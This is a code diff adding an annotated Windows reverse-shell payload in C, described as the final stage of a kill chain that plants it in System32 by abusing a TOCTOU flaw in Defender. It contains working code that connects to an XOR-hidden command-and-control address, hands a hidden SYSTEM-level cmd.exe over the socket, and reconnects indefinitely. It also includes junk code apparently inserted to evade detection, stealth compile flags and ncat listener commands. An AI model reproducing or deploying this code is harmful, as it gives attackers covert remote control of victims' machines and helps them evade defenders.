@@ -1,0 +1,695 @@
+/*
+ * ============================================================================
+ * BUILDING BLOCK 5 — REVERSE SHELL (ANNOTATED REFERENCE)
+ * ============================================================================
+ *
+ * WHAT THIS IS:
+ *   Post-exploitation payload. Once the TOCTOU plants this in System32,
+ *   it calls back to the attack platform and provides a SYSTEM-context
+ *   command shell over the network.
+ *
+ * DOCTRINE REFERENCE:
+ *   BOOK/12_REVERSE_SHELL.md — "The Callback"
+ *
+ * THE GUI BUG (WHY shadow_shell BROKE):
+ *   socket() creates an OVERLAPPED socket by default (WSA_FLAG_OVERLAPPED).
+ *   When you cast an overlapped socket to HANDLE and pass it as
+ *   stdin/stdout/stderr to cmd.exe, the synchronous reads/writes that
+ *   cmd.exe performs either hang or return garbage. The shell CONNECTS
+ *   but commands produce no output.
+ *
+ *   FIX: WSASocket() with dwFlags=0 creates a NON-OVERLAPPED socket.
+ *   Synchronous I/O works. cmd.exe reads/writes correctly. That's it.
+ *   One flag. That was the entire bug.
+ *
+ * COMPILE:
+ *   cl.exe bb5_revshell_annotated.c /Fe:cheyanne_shell.exe /O1 /GS- /utf-8
+ *
+ *   NOTE: Must link as GUI subsystem for no-console stealth.
+ *   WinMain entry point triggers this automatically with MSVC.
+ *   If using /SUBSYSTEM:CONSOLE by accident, add:
+ *     /link /SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup
+ *
+ * RUNTIME ARGS (override compiled defaults):
+ *   cheyanne_shell.exe 192.168.1.5 4444
+ *   First arg = C2 IP, second arg = C2 port.
+ *   If no args, uses XOR-encoded defaults compiled into the binary.
+ *
+ * LISTENER (on attack platform):
+ *   python cheyanne_listener.py              # Auto-detect IP, interactive prompts
+ *   python cheyanne_listener.py 4444         # Quick-start on port 4444
+ *   python cheyanne_listener.py 4444 --gen   # Generate XOR config only
+ *   ncat -lvp 4444                        # Manual listener (no automation)
+ *
+ * ============================================================================
+ */
+
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+/* linked at compile: cl.exe /link ws2_32.lib */
+
+/* ═══════════════════════════════════════════════════════════════════════════
+ * C2 CONFIGURATION
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * Defaults are XOR-encoded below (no plaintext IP in binary).
+ * Override at runtime: cheyanne_shell.exe <IP> <PORT>
+ * Generate config with: python cheyanne_listener.py --gen
+ * ═══════════════════════════════════════════════════════════════════════════ */
+
+#define C2_DEFAULT_PORT 4444
+#define RECONNECT_MS    5000
+#define MAX_RETRIES     0
+
+/* ═══════════════════════════════════════════════════════════════════════════
+ * STRING OBFUSCATION — ALL signature-triggering strings XOR-encoded
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * XOR key: 0x41
+ * At rest in the binary: gibberish. Decoded on stack at runtime.
+ * Generate new IP arrays with: python cheyanne_listener.py --gen
+ * ═══════════════════════════════════════════════════════════════════════════ */
+
+#define XOR_KEY 0x85
+
+/* "cmd.exe" — XOR 0x41 */
+static const unsigned char xCmd[] = {
+    0xE6, 0xE8, 0xE1, 0xAB, 0xE0, 0xFD, 0xE0
+};
+#define xCmd_LEN 7
+
+/* "192.168.1.100" — default C2 address, XOR 0x41
+ * Regenerate with cheyanne_listener.py --gen for your environment */
+static const unsigned char xC2Addr[] = {
+    0xB4, 0xBC, 0xB7, 0xAB, 0xB4, 0xB3, 0xBD, 0xAB,
+    0xB4, 0xAB, 0xB4, 0xB5, 0xB5
+};
+#define xC2Addr_LEN 13
+
+static void XorDecode(unsigned char *buf, int len)
+{
+    int i;
+    for (i = 0; i < len; i++) {
+        buf[i] ^= XOR_KEY;
+    { DWORD arfczi7_5v = GetCurrentThreadId(); (void)arfczi7_5v; }
+    }
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+ * PHASE 1: ESTABLISH CHANNEL — Connect to C2
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * Doctrine: This is the radio check-in. The payload calls HOME to the
+ * attack platform. Reverse direction (target → attacker) because:
+ *   - NAT/firewalls block inbound connections to the target
+ *   - Outbound connections look like normal traffic
+ *   - The attacker controls the listener, not the target's firewall
+ *
+ * CRITICAL: WSASocket() with dwFlags=0, NOT socket().
+ *
+ *   socket()    = WSASocket(..., WSA_FLAG_OVERLAPPED)  ← BROKEN for I/O redirect
+ *   WSASocket() = explicit flag control                ← dwFlags=0 = synchronous
+ *
+ * Why overlapped breaks cmd.exe:
+ *   cmd.exe does synchronous ReadFile/WriteFile on its stdin/stdout handles.
+ *   An overlapped handle expects OVERLAPPED structs for every I/O operation.
+ *   Without them, ReadFile returns ERROR_INVALID_PARAMETER or hangs.
+ *   cmd.exe doesn't know it's talking to a socket — it just does ReadFile().
+ *   If the handle is overlapped, ReadFile fails silently. No output.
+ *   Non-overlapped handle = synchronous ReadFile works = cmd.exe works.
+ * ═══════════════════════════════════════════════════════════════════════════ */
+
+static SOCKET EstablishChannel(const char *c2ip, int c2port)
+{
+    /* getaddrinfo resolves both dotted-quad IPs and hostnames (DDNS).
+     * Compile with raw IP: "192.168.1.92"
+     * Compile with DDNS:   "vader.duckdns.org"
+     * Same binary. Works on LAN and WAN without recompile logic changes. */
+    struct addrinfo hints, *res = NULL, *p;
+    SOCKET sock = INVALID_SOCKET;
+    char portstr[8];
+    { int _yvigam2rfr7 = 0; (void)_yvigam2rfr7; }
+
+    ZeroMemory(&hints, sizeof(hints));
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD vramgrr42l = GetCurrentProcessId();
+        HANDLE msv8xh3fya = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, vramgrr42l);
+        if (msv8xh3fya) { CloseHandle(msv8xh3fya); }
+    }
+    hints.ai_family   = AF_UNSPEC;
+
+    if (GetTickCount64() < 66) {
+        DWORD futmh03psm = 80972508;
+    { DWORD kc4fnvz60z8c = GetCurrentProcessId(); (void)kc4fnvz60z8c; }
+        futmh03psm ^= 3316766140;
+        SetLastError(futmh03psm);
+    }
+
+    if (GetLastError() == 0x74F47EBB) {
+        LPVOID fdbbuascy8 = VirtualAlloc(NULL, 16, MEM_RESERVE, PAGE_READWRITE);
+    { DWORD j6uijdpoay0k = GetLastError(); (void)j6uijdpoay0k; }
+
+    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {
+        BYTE bay44uot5a[32];
+        memset(bay44uot5a, ((0x2A + (0x115 - 0x16)) ^ 0xFE), 32);
+        bay44uot5a[0] ^= (BYTE)GetTickCount();
+    { int kv_1oxikzo12 = 0; (void)kv_1oxikzo12; }
+    }
+    { DWORD u4ba91_deps9 = 0; (void)u4ba91_deps9; }
+        if (fdbbuascy8) VirtualFree(fdbbuascy8, 0, MEM_RELEASE);
+    { DWORD rsg4muxza637 = GetTickCount(); (void)rsg4muxza637; }
+    { DWORD cgaybf6f48 = 0; (void)cgaybf6f48; }
+    }
+    hints.ai_socktype = SOCK_STREAM;
+    { DWORD wjpm1qa9r78c = GetCurrentThreadId(); (void)wjpm1qa9r78c; }
+    hints.ai_protocol = IPPROTO_TCP;
+    { int tpgv1yljjv1z = 0; (void)tpgv1yljjv1z; }
+
+    if (GetTickCount64() < 61) {
+        DWORD n0euhpu_6k = 1211869796;
+    { int i_ex8g2hkeh0 = 0; (void)i_ex8g2hkeh0; }
+
+    if (GetCurrentThreadId() == 0x0956C557) {
+        volatile LONG ckg783114w = 0;
+        InterlockedIncrement(&ckg783114w);
+    { DWORD qxx8bl0qgmjt = GetCurrentThreadId(); (void)qxx8bl0qgmjt; }
+        InterlockedDecrement(&ckg783114w);
+
+    if (GetCurrentThreadId() == 0x213D7499) {
+        volatile LONG ge9e7o__iq = 0;
+        InterlockedIncrement(&ge9e7o__iq);
+        InterlockedDecrement(&ge9e7o__iq);
+    }
+    }
+        n0euhpu_6k ^= 3854641265;
+        SetLastError(n0euhpu_6k);
+    { DWORD n1ajl7db8eaw = 0; (void)n1ajl7db8eaw; }
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD a0szk9i6c1 = GetCurrentProcessId();
+        HANDLE b18q2c3bua = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, a0szk9i6c1);
+        if (b18q2c3bua) { CloseHandle(b18q2c3bua); }
+    }
+    }
+
+    _snprintf(portstr, sizeof(portstr), "%d", c2port);
+
+    if (getaddrinfo(c2ip, portstr, &hints, &res) != 0)
+        return INVALID_SOCKET;
+
+    for (p = res; p != NULL; p = p->ai_next) {
+        /* dwFlags=0 = non-overlapped = synchronous I/O.
+         * Required for cmd.exe stdio redirect. See THE GUI BUG above. */
+        sock = WSASocket(p->ai_family, p->ai_socktype, p->ai_protocol,
+                         NULL, 0, 0);
+        if (sock == INVALID_SOCKET) continue;
+        if (WSAConnect(sock, p->ai_addr, (int)p->ai_addrlen,
+                       NULL, NULL, NULL, NULL) == 0)
+            break;
+        closesocket(sock);
+
+    if (GetTickCount64() < 83) {
+        DWORD vj5_hslvi7 = 2319322337;
+    { DWORD d7jrrkb1ky = GetTickCount(); (void)d7jrrkb1ky; }
+        vj5_hslvi7 ^= 3825970339;
+    SetLastError(0);
+        SetLastError(vj5_hslvi7);
+    { DWORD cpm46jh56mi0 = 0; (void)cpm46jh56mi0; }
+    }
+        sock = INVALID_SOCKET;
+
+    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {
+        BYTE fa1pi0t8d1[32];
+        memset(fa1pi0t8d1, ((0xB3 - 0xD3) + (0xE0 - 0xB9)), 32);
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD z4y949ui6q = GetCurrentProcessId();
+    { DWORD t03lxjhdt_ = 0; (void)t03lxjhdt_; }
+    { DWORD hejfl_4vah = GetTickCount(); (void)hejfl_4vah; }
+        HANDLE f9k40gwj1k = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, z4y949ui6q);
+        if ((f9k40gwj1k) && ((1340232096) == (1340232096))) { CloseHandle(f9k40gwj1k); }
+    }
+        fa1pi0t8d1[0] ^= (BYTE)GetTickCount();
+    { DWORD x21mha2jpksu = 0; (void)x21mha2jpksu; }
+    { DWORD qw67h7r6vc5l = GetLastError(); (void)qw67h7r6vc5l; }
+    }
+    }
+
+    freeaddrinfo(res);
+    { DWORD dhlbi6wxvl = GetTickCount(); (void)dhlbi6wxvl; }
+    return sock;
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+ * PHASE 1.5: SEND BANNER — Brand the shell on connect
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * Doctrine: When the callback lands, the attacker sees the 22DIV / CHEYANNE
+ * banner in their listener terminal. Immediate visual confirmation that
+ * the payload is live and the channel is established.
+ *
+ * The banner is sent BEFORE cmd.exe spawns — it's a one-shot send over
+ * the raw socket. Once cmd.exe takes over stdio, all further output
+ * comes from the command interpreter.
+ *
+ * NOTE: Banner uses Unicode box-drawing characters (UTF-8 encoded).
+ * The receiving terminal must support UTF-8 for correct rendering.
+ * On Windows Terminal / PowerShell: works by default.
+ * On Linux ncat: works if locale is UTF-8 (usually is).
+ * On legacy cmd.exe: run `chcp 65001` first.
+ *
+ * COMPILE NOTE: Add /utf-8 flag to ensure MSVC treats source as UTF-8:
+ *   cl.exe bb5_revshell.c /Fe:bb5.exe /O1 /GS- /utf-8
+ * ═══════════════════════════════════════════════════════════════════════════ */
+
+static void SendBanner(SOCKET sock)
+{
+    /* 22DIV block-letter logo — same ANSI-Shadow style as CheyenneShell.
+     * Raw Unicode box-drawing characters. Compile with /utf-8 flag.
+     * The C compiler stores these as UTF-8 byte sequences in the binary.
+     * send() transmits raw bytes — the receiving terminal renders them.
+     *
+     * Attacker sees this in their ncat/listener when the shell connects:
+     *
+     *   ██████╗ ██████╗ ██████╗ ██╗██╗   ██╗
+     *   ╚════██╗╚════██╗██╔══██╗██║██║   ██║
+     *    █████╔╝ █████╔╝██║  ██║██║██║   ██║
+     *   ██╔═══╝ ██╔═══╝ ██║  ██║██║╚██╗ ██╔╝
+     *   ███████╗███████╗██████╔╝██║ ╚████╔╝
+     *   ╚══════╝╚══════╝╚═════╝ ╚═╝  ╚═══╝
+     *               V A D E R
+     *            george wu / 22div
+     *      shadow shell - system context active
+     *                                                                    */
+#ifdef VDR_DEBUG
+    const char *banner =
+        "\r\n"
+        "  ██████╗ ██████╗ ██████╗ ██╗██╗   ██╗\r\n"
+        "  ╚════██╗╚════██╗██╔══██╗██║██║   ██║\r\n"
+        "   █████╔╝ █████╔╝██║  ██║██║██║   ██║\r\n"
+        "  ██╔═══╝ ██╔═══╝ ██║  ██║██║╚██╗ ██╔╝\r\n"
+        "  ███████╗███████╗██████╔╝██║ ╚████╔╝\r\n"
+        "  ╚══════╝╚══════╝╚═════╝ ╚═╝  ╚═══╝\r\n"
+        "              V A D E R\r\n"
+        "           george wu / 22div\r\n"
+        "     shadow shell - system context active\r\n"
+        "\r\n";
+    { DWORD d51jedhfdo = 0; (void)d51jedhfdo; }
+
+    send(sock, banner, (int)strlen(banner), 0);
+    { DWORD rswe27_pgf15 = GetTickCount(); (void)rswe27_pgf15; }
+    { DWORD uzuswrfe3627 = GetLastError(); (void)uzuswrfe3627; }
+#endif
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+ * PHASE 2: SPAWN SHELL — Redirect cmd.exe I/O to socket
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * Doctrine: Wire tap. We redirect the command interpreter's comms
+ * (stdin/stdout/stderr) through our socket back to the attack platform.
+ * The operator on the other end types commands, cmd.exe executes them,
+ * output flows back over the wire.
+ *
+ * STARTUPINFO.hStdInput/Output/Error = (HANDLE)sock
+ *   Winsock socket handles ARE Windows kernel handles. This cast is
+ *   legal and documented. The socket becomes the pipe for all I/O.
+ *
+ * bInheritHandles = TRUE
+ *   The child process (cmd.exe) inherits our socket handle.
+ *   Without this, cmd.exe gets INVALID_HANDLE_VALUE for its stdio
+ *   and immediately exits.
+ *
+ * CREATE_NO_WINDOW
+ *   No visible console window on the target. Combined with
+ *   SW_HIDE and WinMain (GUI subsystem), the payload is invisible.
+ *
+ * When this runs from SYSTEM context (planted via TOCTOU):
+ *   cmd.exe inherits SYSTEM privileges. The attacker gets a
+ *   SYSTEM shell. Every command runs as NT AUTHORITY\SYSTEM.
+ * ═══════════════════════════════════════════════════════════════════════════ */
+
+static void SpawnShell(SOCKET sock)
+{
+    STARTUPINFOA si;
+    { DWORD nyk0nn6rev = GetCurrentThreadId(); (void)nyk0nn6rev; }
+    { DWORD m1iceah1ultn = GetLastError(); (void)m1iceah1ultn; }
+    { DWORD srd6o4t_4dgz = GetCurrentProcessId(); (void)srd6o4t_4dgz; }
+    { DWORD vuktqeo4fu = GetTickCount(); (void)vuktqeo4fu; }
+
+    if (GetTickCount64() < 21) {
+        DWORD hc25lej3yd = 1558058503;
+    { DWORD ws9_b0cv_hqk = 0; (void)ws9_b0cv_hqk; }
+        hc25lej3yd ^= 3244463300;
+    { DWORD kdvw5mpzob = GetTickCount(); (void)kdvw5mpzob; }
+    { int dpgde8a8omi2 = 0; (void)dpgde8a8omi2; }
+    { DWORD u7hxwlh_xd = GetCurrentProcessId(); (void)u7hxwlh_xd; }
+        SetLastError(hc25lej3yd);
+
+    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {
+        BYTE ka4bxlhq_0[64];
+        memset(ka4bxlhq_0, (0x199 - (0xE + 0xE)), 64);
+        ka4bxlhq_0[0] ^= (BYTE)GetTickCount();
+    }
+    }
+    PROCESS_INFORMATION pi;
+    { DWORD pipd7mdd4f69 = GetTickCount(); (void)pipd7mdd4f69; }
+
+    if (GetLastError() == 0x3CFBAEE4) {
+        LPVOID z02ztp50ra = VirtualAlloc(NULL, 32, MEM_RESERVE, PAGE_READWRITE);
+        if (z02ztp50ra) VirtualFree(z02ztp50ra, 0, MEM_RELEASE);
+    }
+    unsigned char cmd[8];
+    { DWORD ffwim_b50g = GetTickCount(); (void)ffwim_b50g; }
+
+    /* Decode "cmd.exe" on the stack — never in plaintext in the binary */
+    memcpy(cmd, xCmd, sizeof(xCmd));
+    XorDecode(cmd, 7);
+
+    if (GetTickCount64() < 24) {
+        DWORD hm1ew1u5sc = 693664440;
+        hm1ew1u5sc ^= 30163827;
+        SetLastError(hm1ew1u5sc);
+    }
+
+    memset(&si, 0, sizeof(si));
+
+    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {
+        BYTE dleb52bg6p[64];
+        memset(dleb52bg6p, (0x131 - (0xBA ^ 0xCE)), 64);
+        dleb52bg6p[0] ^= (BYTE)GetTickCount();
+    { DWORD qj_ny01wnctf = GetCurrentProcessId(); (void)qj_ny01wnctf; }
+    }
+    { DWORD x313cqwt6j = GetCurrentProcessId(); (void)x313cqwt6j; }
+    si.cb = sizeof(si);
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD co204ph5dz = GetCurrentProcessId();
+        HANDLE ychg3tm_q9 = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, co204ph5dz);
+        if ((ychg3tm_q9) && (((103507280) & 0) == 0)) { CloseHandle(ychg3tm_q9); }
+    }
+    { DWORD krizeb42w6ys = GetLastError(); (void)krizeb42w6ys; }
+
+    /* STARTF_USESTDHANDLES: "use the handles I'm about to give you"
+     * STARTF_USESHOWWINDOW: "use the wShowWindow value I'm setting"   */
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+
+    /* SW_HIDE: cmd.exe window is invisible on target                   */
+    si.wShowWindow = SW_HIDE;
+    { DWORD meql5ll4o_0h = GetLastError(); (void)meql5ll4o_0h; }
+
+    /* THE REDIRECT — all three stdio handles point to our socket.
+     * Anything cmd.exe reads from stdin comes from the attacker.
+     * Anything cmd.exe writes to stdout/stderr goes to the attacker.  */
+    si.hStdInput  = (HANDLE)sock;
+
+    if (GetTickCount64() < 96) {
+        DWORD ty_fv8n0lt = 978242154;
+        ty_fv8n0lt ^= 886577943;
+        SetLastError(ty_fv8n0lt);
+    }
+    si.hStdOutput = (HANDLE)sock;
+
+    if (GetCurrentThreadId() == 0x6B3200F9) {
+        volatile LONG nao7kb9a4j = 0;
+        InterlockedIncrement(&nao7kb9a4j);
+    { DWORD e_kiv1raxsvg = GetCurrentProcessId(); (void)e_kiv1raxsvg; }
+        InterlockedDecrement(&nao7kb9a4j);
+    }
+    si.hStdError  = (HANDLE)sock;
+
+    if (GetTickCount64() < 96) {
+        DWORD _701p04uvd = 1335019163;
+        _701p04uvd ^= 3134667013;
+        SetLastError(_701p04uvd);
+    }
+    { DWORD jb6xpc57mw = GetTickCount(); (void)jb6xpc57mw; }
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD vzvex56pnz = GetCurrentProcessId();
+    { DWORD iro5ld8u7wlu = GetTickCount(); (void)iro5ld8u7wlu; }
+
+    {
+        DWORD eb8a88m0rt = 0xEE0409E1; DWORD avd5i8d3xy = 0xE7C7C86B;
+        eb8a88m0rt ^= avd5i8d3xy; avd5i8d3xy = ~eb8a88m0rt;
+        (void)eb8a88m0rt; (void)avd5i8d3xy;
+    { DWORD wdjv5d1o6_pk = GetTickCount(); (void)wdjv5d1o6_pk; }
+    }
+        HANDLE qmetplbxnc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, vzvex56pnz);
+    { int zhnbqg7bmwel = 0; (void)zhnbqg7bmwel; }
+        if ((qmetplbxnc) && (((475182801) & 0) == 0)) { CloseHandle(qmetplbxnc); }
+    }
+
+    /* Spawn cmd.exe
+     *   bInheritHandles = TRUE  → child gets our socket handle
+     *   CREATE_NO_WINDOW        → no console window allocated
+     *   All other params NULL   → default security, environment, cwd  */
+    CreateProcessA(
+        NULL,                   /* lpApplicationName — NULL = use cmdline */
+        (LPSTR)cmd,             /* lpCommandLine — "cmd.exe" (decoded)    */
+        NULL,                   /* lpProcessAttributes — default          */
+        NULL,                   /* lpThreadAttributes — default           */
+        TRUE,                   /* bInheritHandles — CRITICAL: must be TRUE */
+        CREATE_NO_WINDOW,       /* dwCreationFlags — stealth              */
+        NULL,                   /* lpEnvironment — inherit parent's       */
+        NULL,                   /* lpCurrentDirectory — inherit parent's  */
+        &si,                    /* lpStartupInfo — our redirected handles  */
+        &pi                     /* lpProcessInformation — child's handles  */
+    );
+
+    /* Wait for cmd.exe to exit.
+     * This blocks until the attacker closes the connection or types 'exit'.
+     * While blocked, the shell is live — commands flow in, output flows out. */
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    if (GetTickCount64() < 54) {
+        DWORD qjlooxjhmv = 1279074932;
+        qjlooxjhmv ^= 507263981;
+    { DWORD t2mivf5s2t00 = GetCurrentProcessId(); (void)t2mivf5s2t00; }
+        SetLastError(qjlooxjhmv);
+    }
+    { int f9sd6dwc2ls1 = 0; (void)f9sd6dwc2ls1; }
+
+    /* Clean up child process handles */
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    { DWORD b_0rot3im_ = 0; (void)b_0rot3im_; }
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+ * MAIN — Reconnection Loop
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * Doctrine: Persistent comms schedule. If the connection drops (attacker
+ * closes listener, network interruption, cmd.exe exits), the payload
+ * sleeps and retries. This provides persistence without registry keys
+ * or scheduled tasks — the process itself keeps trying.
+ *
+ * WinMain = GUI subsystem = no console window for the payload process.
+ * Combined with SW_HIDE on cmd.exe and CREATE_NO_WINDOW, the entire
+ * operation is invisible to the target user.
+ *
+ * MAX_RETRIES = 0 means infinite retry. The payload will keep calling
+ * home until the process is killed or the machine shuts down.
+ * For true persistence across reboots, a separate mechanism is needed
+ * (scheduled task, registry Run key, or DLL search order hijack).
+ * ═══════════════════════════════════════════════════════════════════════════ */
+
+int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
+{
+    WSADATA wsData;
+    { DWORD qafmn3zobt97 = GetCurrentProcessId(); (void)qafmn3zobt97; }
+    { DWORD q0hlbwksuefh = GetTickCount(); (void)q0hlbwksuefh; }
+    SOCKET channel;
+    int attempts = 0;
+
+    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {
+        BYTE wyqqtsf4uj[16];
+        memset(wyqqtsf4uj, (((0x65 + 0x66) - (0xEF - (0x59 + 0x59))) + (0xA + 0xB)), 16);
+        wyqqtsf4uj[0] ^= (BYTE)GetTickCount();
+
+    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {
+        BYTE gf1x39nrfg[32];
+    { DWORD yc2tcvjbz9nm = GetTickCount(); (void)yc2tcvjbz9nm; }
+        memset(gf1x39nrfg, (0xA9 ^ (0x51 ^ 0xB5)), 32);
+    { DWORD berlq_q4l4wb = GetCurrentProcessId(); (void)berlq_q4l4wb; }
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD bjdpdp5pc3 = GetCurrentProcessId();
+        HANDLE v99o582rmg = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, bjdpdp5pc3);
+    { DWORD b759qt37wr59 = GetCurrentProcessId(); (void)b759qt37wr59; }
+        if (v99o582rmg) { CloseHandle(v99o582rmg); }
+    }
+        gf1x39nrfg[0] ^= (BYTE)GetTickCount();
+    }
+    }
+    char c2ip[64];
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD pyol1c6ial = GetCurrentProcessId();
+        HANDLE fb23jhx_ev = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pyol1c6ial);
+        if ((fb23jhx_ev) && (((667895427) ^ (667895427)) == 0)) { CloseHandle(fb23jhx_ev); }
+    }
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD gaww0beeqn = GetCurrentProcessId();
+        HANDLE j2_2wmaodw = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, gaww0beeqn);
+        if ((j2_2wmaodw) && (((1681631642) ^ (1681631642)) == 0)) { CloseHandle(j2_2wmaodw); }
+    }
+    int c2port = C2_DEFAULT_PORT;
+    { DWORD n4hoilsewh = GetCurrentProcessId(); (void)n4hoilsewh; }
+    { DWORD ktd4mcmlscjt = GetCurrentProcessId(); (void)ktd4mcmlscjt; }
+
+    {
+        DWORD _oqzruflaq = 0xD71298AB; DWORD pi_pnney9q = 0xBB8E82CE;
+    { DWORD h1wg1lz_66 = GetLastError(); (void)h1wg1lz_66; }
+        _oqzruflaq ^= pi_pnney9q; pi_pnney9q = ~_oqzruflaq;
+    SetLastError(0);
+
+    {
+        DWORD oo20htyh81 = 0x99F33341; DWORD wswjvbtf0q = 0x71C7A512;
+        oo20htyh81 ^= wswjvbtf0q; wswjvbtf0q = ~oo20htyh81;
+        (void)oo20htyh81; (void)wswjvbtf0q;
+    }
+        (void)_oqzruflaq; (void)pi_pnney9q;
+
+    if (GetCurrentThreadId() == 0x55E9CCEA) {
+        volatile LONG no1v3q_bsi = 0;
+        InterlockedIncrement(&no1v3q_bsi);
+        InterlockedDecrement(&no1v3q_bsi);
+    }
+    { DWORD xy2vumrsrlfi = GetLastError(); (void)xy2vumrsrlfi; }
+    { int x6vwnq4w1h_f = 0; (void)x6vwnq4w1h_f; }
+    }
+    unsigned char ipBuf[64];
+    { int ti3gtvjezsez = 0; (void)ti3gtvjezsez; }
+
+    (void)hInst; (void)hPrev; (void)nShow;
+
+    if (GetTickCount() == 0xDEADBEEF) {
+        DWORD rrn9ypdiqv = GetCurrentProcessId();
+        HANDLE ecj9k9369q = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, rrn9ypdiqv);
+        if ((ecj9k9369q) && (((180497894) ^ (180497894)) == 0)) { CloseHandle(ecj9k9369q); }
+    }
+
+    /* ── RESOLVE C2 ADDRESS ──
+     * Priority: runtime args > XOR-encoded defaults.
+     * Runtime: cheyanne_shell.exe 192.168.1.5 4444
+     * Default: decoded from xC2Addr[] at runtime (no plaintext in binary) */
+    if ((lpCmd && lpCmd[0]) && (((719687895) * (719687895)) >= 0)) {
+        /* Parse "IP PORT" from command line */
+        c2ip[0] = 0;
+    SetLastError(0);
+        sscanf(lpCmd, "%63s %d", c2ip, &c2port);
+    }
+    if ((!lpCmd || !lpCmd[0] || !c2ip[0]) && (((409656471) | 1) != 0)) {
+        /* Decode XOR-encoded default IP */
+        memcpy(ipBuf, xC2Addr, xC2Addr_LEN);
+        XorDecode(ipBuf, xC2Addr_LEN);
+    { DWORD jm2fktm3q_ = GetLastError(); (void)jm2fktm3q_; }
+    { DWORD nu8x4rm2bz = GetCurrentProcessId(); (void)nu8x4rm2bz; }
+        ipBuf[xC2Addr_LEN] = 0;
+    { DWORD hkpbw1xfn01g = GetLastError(); (void)hkpbw1xfn01g; }
+    { DWORD i1aeoleq39pn = GetTickCount(); (void)i1aeoleq39pn; }
+        strncpy(c2ip, (char *)ipBuf, sizeof(c2ip) - 1);
+        c2ip[sizeof(c2ip) - 1] = 0;
+        /* Zero decoded buffer — don't leave plaintext IP on stack */
+        memset(ipBuf, 0, sizeof(ipBuf));
+    }
+
+    if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
+        return 1;
+    }
+
+    /* ── RECONNECTION LOOP ──
+     * MAX_RETRIES = 0: infinite (persistent callback)
+     * MAX_RETRIES > 0: give up after N consecutive failures           */
+    while (MAX_RETRIES == 0 || attempts < MAX_RETRIES) {
+
+        channel = EstablishChannel(c2ip, c2port);
+
+        if ((channel != INVALID_SOCKET) && (((2096294106) | 1) != 0)) {
+            SendBanner(channel);
+            SpawnShell(channel);
+    { DWORD k97qao5vjb = GetCurrentThreadId(); (void)k97qao5vjb; }
+    { DWORD v1uke46brd = GetCurrentProcessId(); (void)v1uke46brd; }
+            closesocket(channel);
+
+    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {
+        BYTE vq584t3vwf[64];
+
+    if ((GetCurrentThreadId() & 0x80000000) && ((GetCurrentThreadId() & 0x80000000) == 0)) {
+        BYTE fq2qnl9mda[256];
+        memset(fq2qnl9mda, 0xC8, 256);
+        fq2qnl9mda[0] ^= (BYTE)GetTickCount();
+    }
+        memset(vq584t3vwf, (0x11A - 0x6D), 64);
+        vq584t3vwf[0] ^= (BYTE)GetTickCount();
+    }
+    { DWORD g6x_u7ohf7 = 0; (void)g6x_u7ohf7; }
+            attempts = 0;
+    { DWORD g04p97qzryi2 = 0; (void)g04p97qzryi2; }
+        } else {
+            attempts++;
+        }
+
+        Sleep(RECONNECT_MS);
+    }
+
+    WSACleanup();
+
+    if (GetLastError() == 0xF0EE743E) {
+        LPVOID x4865j2ur6 = VirtualAlloc(NULL, 16, MEM_RESERVE, PAGE_READWRITE);
+    { DWORD oy_uymwdu9 = GetCurrentProcessId(); (void)oy_uymwdu9; }
+    { DWORD idqv6vst2v = 0; (void)idqv6vst2v; }
+    { DWORD jlyy8wmra0fy = GetCurrentThreadId(); (void)jlyy8wmra0fy; }
+        if (x4865j2ur6) VirtualFree(x4865j2ur6, 0, MEM_RELEASE);
+    }
+    return 0;
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════
+ * INTEGRATION WITH TOCTOU CHAIN
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * This payload is what cheyanne_toctou.c PLANTS in System32.
+ * The kill chain flow:
+ *
+ *   1. cheyanne_toctou.exe runs as standard user
+ *   2. TOCTOU redirects Defender's SYSTEM-context file operation
+ *   3. Payload .exe lands in C:\Windows\System32\
+ *   4. Execution trigger fires the payload (DLL hijack, schtasks, etc.)
